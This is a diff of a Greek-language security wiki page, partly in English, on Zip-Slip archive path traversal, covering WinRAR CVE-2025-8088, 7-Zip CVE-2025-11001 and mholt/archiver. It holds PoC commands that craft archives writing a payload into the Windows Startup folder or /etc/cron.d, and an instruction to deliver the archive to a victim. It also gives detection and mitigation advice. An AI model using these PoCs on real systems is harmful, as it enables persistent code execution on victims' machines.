@@ -2,29 +2,32 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Overview
+## Επισκόπηση
 
-Πολλές μορφές αρχείων (ZIP, RAR, TAR, 7-ZIP, κ.λπ.) επιτρέπουν σε κάθε εγγραφή να φέρει το δικό της **εσωτερικό μονοπάτι**. Όταν ένα εργαλείο εξαγωγής τιμά τυφλά αυτό το μονοπάτι, ένα κατασκευασμένο όνομα αρχείου που περιέχει `..` ή ένα **απόλυτο μονοπάτι** (π.χ. `C:\Windows\System32\`) θα γραφτεί εκτός του επιλεγμένου καταλόγου από τον χρήστη. Αυτή η κατηγορία ευπάθειας είναι ευρέως γνωστή ως *Zip-Slip* ή **archive extraction path traversal**.
+Πολλές μορφές αρχείων συμπίεσης (ZIP, RAR, TAR, 7-ZIP, κ.λπ.) επιτρέπουν σε κάθε εγγραφή να φέρει τη δική της **εσωτερική διαδρομή**. Όταν ένα εργαλείο εξαγωγής εφαρμόζει χωρίς έλεγχο αυτή τη διαδρομή, ένα κατασκευασμένο όνομα αρχείου που περιέχει `..` ή μια **απόλυτη διαδρομή** (π.χ. `C:\Windows\System32\`) θα γραφτεί εκτός του καταλόγου που επέλεξε ο χρήστης.
+Αυτή η κατηγορία ευπάθειας είναι ευρέως γνωστή ως *Zip-Slip* ή **archive extraction path traversal**.
 
-Οι συνέπειες κυμαίνονται από την επαναγραφή αυθαίρετων αρχείων έως την άμεση επίτευξη **remote code execution (RCE)** ρίχνοντας ένα payload σε μια **auto-run** τοποθεσία όπως ο φάκελος *Startup* των Windows.
+Οι συνέπειες κυμαίνονται από την υπεργραφή αυθαίρετων αρχείων έως την άμεση επίτευξη **remote code execution (RCE)**, τοποθετώντας ένα payload σε μια **auto-run** τοποθεσία, όπως ο φάκελος *Startup* των Windows.
 
-## Root Cause
+## Βασική αιτία
 
-1. Ο επιτιθέμενος δημιουργεί ένα αρχείο όπου μία ή περισσότερες κεφαλίδες αρχείων περιέχουν:
-* Σειρές σχετικής διαδρομής (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
-* Απόλυτα μονοπάτια (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
-2. Το θύμα εξάγει το αρχείο με ένα ευάλωτο εργαλείο που εμπιστεύεται το ενσωματωμένο μονοπάτι αντί να το καθαρίζει ή να αναγκάζει την εξαγωγή κάτω από τον επιλεγμένο κατάλογο.
-3. Το αρχείο γράφεται στην τοποθεσία που ελέγχεται από τον επιτιθέμενο και εκτελείται/φορτώνεται την επόμενη φορά που το σύστημα ή ο χρήστης ενεργοποιεί αυτό το μονοπάτι.
+1. Ο επιτιθέμενος δημιουργεί ένα αρχείο όπου ένα ή περισσότερα headers αρχείων περιέχουν:
+* Σχετικές ακολουθίες διαφυγής (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
+* Απόλυτες διαδρομές (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
+* Ή κατασκευασμένα **symlinks** που επιλύονται έξω από τον στοχευμένο κατάλογο (συνήθη σε ZIP/TAR σε *nix*).
+2. Το θύμα εξάγει το αρχείο με ένα ευάλωτο εργαλείο που εμπιστεύεται την ενσωματωμένη διαδρομή (ή ακολουθεί symlinks) αντί να την εξυγιάνει ή να επιβάλει την εξαγωγή κάτω από τον επιλεγμένο κατάλογο.
+3. Το αρχείο γράφεται στην τοποθεσία που ελέγχεται από τον επιτιθέμενο και εκτελείται/φορτώνεται την επόμενη φορά που το σύστημα ή ο χρήστης ενεργοποιεί αυτή τη διαδρομή.
 
-## Real-World Example – WinRAR ≤ 7.12 (CVE-2025-8088)
+## Πραγματικό Παράδειγμα – WinRAR ≤ 7.12 (CVE-2025-8088)
 
-WinRAR για Windows (συμπεριλαμβανομένων των `rar` / `unrar` CLI, της DLL και της φορητής πηγής) απέτυχε να επικυρώσει τα ονόματα αρχείων κατά την εξαγωγή. Ένα κακόβουλο αρχείο RAR που περιέχει μια εγγραφή όπως:
+WinRAR for Windows (including the `rar` / `unrar` CLI, the DLL and the portable source) failed to validate filenames during extraction.
+A malicious RAR archive containing an entry such as:
 ```text
 ..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
 ```
-θα κατέληγε **έξω** από τον επιλεγμένο φάκελο εξόδου και μέσα στον *Φάκελο Εκκίνησης* του χρήστη. Μετά την είσοδο, τα Windows εκτελούν αυτόματα όλα όσα υπάρχουν εκεί, παρέχοντας *μόνιμο* RCE.
+θα κατέληγε **εκτός** του επιλεγμένου καταλόγου εξόδου και μέσα στο *Startup* φάκελο του χρήστη. Μετά τη σύνδεση, τα Windows εκτελούν αυτόματα ό,τι υπάρχει εκεί, παρέχοντας *επίμονη* RCE.
 
-### Δημιουργία ενός PoC Αρχείου (Linux/Mac)
+### Δημιουργία ενός PoC Archive (Linux/Mac)
 ```bash
 # Requires rar >= 6.x
 mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
@@ -32,37 +35,64 @@ cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Sta
 rar a -ep evil.rar evil/*
 ```
 Options used:
-* `-ep`  – αποθήκευση διαδρομών αρχείων ακριβώς όπως δίνονται (μην αφαιρείτε το `./`).
+* `-ep`  – αποθηκεύει τα μονοπάτια αρχείων ακριβώς όπως δίνονται (μην **αφαιρείτε** το αρχικό `./`).
 
-Παραδώστε το `evil.rar` στο θύμα και δώστε τους οδηγίες να το εξάγουν με μια ευάλωτη έκδοση του WinRAR.
+Deliver `evil.rar` to the victim and instruct them to extract it with a vulnerable WinRAR build.
 
-### Παρατηρούμενη Εκμετάλλευση στην Πραγματικότητα
+### Παρατηρημένη εκμετάλλευση στο πεδίο
 
-Η ESET ανέφερε καμπάνιες spear-phishing RomCom (Storm-0978/UNC2596) που επισύναψαν αρχεία RAR εκμεταλλευόμενα το CVE-2025-8088 για να αναπτύξουν προσαρμοσμένα backdoors και να διευκολύνουν τις επιχειρήσεις ransomware.
+ESET reported RomCom (Storm-0978/UNC2596) spear-phishing campaigns that attached RAR archives abusing CVE-2025-8088 to deploy customised backdoors and facilitate ransomware operations.
 
-## Συμβουλές Ανίχνευσης
+## Πιο πρόσφατες περιπτώσεις (2024–2025)
 
-* **Στατική επιθεώρηση** – Καταγράψτε τις καταχωρίσεις του αρχείου και σημειώστε οποιοδήποτε όνομα περιέχει `../`, `..\\`, *απόλυτες διαδρομές* (`C:`) ή μη κανονικοποιημένες κωδικοποιήσεις UTF-8/UTF-16.
-* **Εξαγωγή σε sandbox** – Αποσυμπιέστε σε έναν αναλώσιμο φάκελο χρησιμοποιώντας έναν *ασφαλή* extractor (π.χ., Python’s `patool`, 7-Zip ≥ τελευταίας έκδοσης, `bsdtar`) και επαληθεύστε ότι οι προκύπτουσες διαδρομές παραμένουν μέσα στον φάκελο.
-* **Παρακολούθηση τερματικών** – Ειδοποιήστε για νέα εκτελέσιμα που γράφονται σε τοποθεσίες `Startup`/`Run` λίγο μετά το άνοιγμα ενός αρχείου από το WinRAR/7-Zip/κ.λπ.
+### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
+* **Σφάλμα**: ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. User interaction is just *opening/extracting* the archive.
+* **Επηρεαζόμενα**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
+* **Επίπτωση**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
+* **Quick PoC (Linux)**:
+```bash
+mkdir -p out
+ln -s /etc/cron.d evil
+zip -y exploit.zip evil   # -y preserves symlinks
+7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
+```
+Σε επιδιορθωμένη έκδοση το `/etc/cron.d` δεν θα πειραχτεί· το symlink εξάγεται ως σύνδεσμος μέσα στο `/tmp/target`.
 
-## Μετριασμός & Σκληραγώγηση
+### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
+* **Σφάλμα**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
+* **Επηρεαζόμενα**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
+* **Διόρθωση**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
+* **Ελάχιστη αναπαραγωγή**:
+```go
+// go test . with archiver<=3.5.1
+archiver.Unarchive("exploit.zip", "/tmp/safe")
+// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
+```
 
-1. **Ενημερώστε τον extractor** – Το WinRAR 7.13 εφαρμόζει σωστή απολύμανση διαδρομών. Οι χρήστες πρέπει να το κατεβάσουν χειροκίνητα γιατί το WinRAR δεν διαθέτει μηχανισμό αυτόματης ενημέρωσης.
-2. Εξάγετε αρχεία με την επιλογή **“Αγνόησε διαδρομές”** (WinRAR: *Εξαγωγή → "Μη εξαγωγή διαδρομών"*) όταν είναι δυνατόν.
-3. Ανοίξτε μη αξιόπιστα αρχεία **μέσα σε sandbox** ή VM.
-4. Εφαρμόστε λευκή λίστα εφαρμογών και περιορίστε την πρόσβαση εγγραφής χρηστών σε καταλόγους αυτόματης εκκίνησης.
+## Συμβουλές ανίχνευσης
 
-## Πρόσθετες Επηρεαζόμενες / Ιστορικές Περιπτώσεις
+* **Στατική επιθεώρηση** – List archive entries and flag any name containing `../`, `..\\`, *απόλυτα μονοπάτια* (`/`, `C:`) ή εγγραφές τύπου *symlink* των οποίων ο στόχος βρίσκεται έξω από τον κατάλογο εξαγωγής.
+* **Canonicalisation** – Ensure `realpath(join(dest, name))` still starts with `dest`. Reject otherwise.
+* **Απομόνωση εξαγωγής** – Αποσυμπιέστε σε έναν προσωρινό κατάλογο χρησιμοποιώντας έναν *ασφαλή* extractor (π.χ., `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) και επαληθεύστε ότι τα προκύπτοντα μονοπάτια παραμένουν εντός του καταλόγου.
+* **Endpoint monitoring** – Alert on new executables written to `Startup`/`Run`/`cron` locations shortly after an archive is opened by WinRAR/7-Zip/etc.
 
-* 2018 – Μαζική *Zip-Slip* προειδοποίηση από την Snyk που επηρεάζει πολλές βιβλιοθήκες Java/Go/JS.
-* 2023 – 7-Zip CVE-2023-4011 παρόμοια διαδρομή κατά τη διάρκεια συγχώνευσης `-ao`.
-* Οποιαδήποτε προσαρμοσμένη λογική εξαγωγής που αποτυγχάνει να καλέσει `PathCanonicalize` / `realpath` πριν από την εγγραφή.
+## Μετριασμός & Σκληρυνση
 
-## Αναφορές
+1. **Ενημερώστε το εργαλείο εξαγωγής** – WinRAR 7.13+ και 7-Zip 25.00+ εφαρμόζουν εξυγίανση μονοπατιών/symlink. Και τα δύο εργαλεία εξακολουθούν να μην διαθέτουν αυτόματες ενημερώσεις.
+2. Extract archives with “**Do not extract paths**” / “**Ignore paths**” when possible.
+3. Σε Unix, μειώστε τα προνόμια & προσαρτήστε ένα **chroot/namespace** πριν την εξαγωγή· σε Windows, χρησιμοποιήστε **AppContainer** ή ένα sandbox.
+4. Εάν γράφετε προσαρμοσμένο κώδικα, κανονικοποιήστε με `realpath()`/`PathCanonicalize()` **πριν** τη δημιουργία/εγγραφή, και απορρίψτε οποιαδήποτε εγγραφή διαφεύγει του προορισμού.
 
-- [BleepingComputer – WinRAR zero-day exploited to plant malware on archive extraction](https://www.bleepingcomputer.com/news/security/winrar-zero-day-flaw-exploited-by-romcom-hackers-in-phishing-attacks/)
-- [WinRAR 7.13 Changelog](https://www.win-rar.com/singlenewsview.html?&L=0&tx_ttnews%5Btt_news%5D=283&cHash=a64b4a8f662d3639dec8d65f47bc93c5)
-- [Snyk – Zip Slip vulnerability write-up](https://snyk.io/research/zip-slip-vulnerability)
+## Επιπλέον επηρεαζόμενες / Ιστορικές περιπτώσεις
+
+* 2018 – Μεγάλη ειδοποίηση *Zip-Slip* από τη Snyk που επηρέασε πολλές βιβλιοθήκες Java/Go/JS.
+* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
+* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
+* Οποιαδήποτε προσαρμοσμένη λογική εξαγωγής που δεν καλεί `PathCanonicalize` / `realpath` πριν την εγγραφή.
+
+## References
+
+- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
+- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
 
 {{#include ../banners/hacktricks-training.md}}
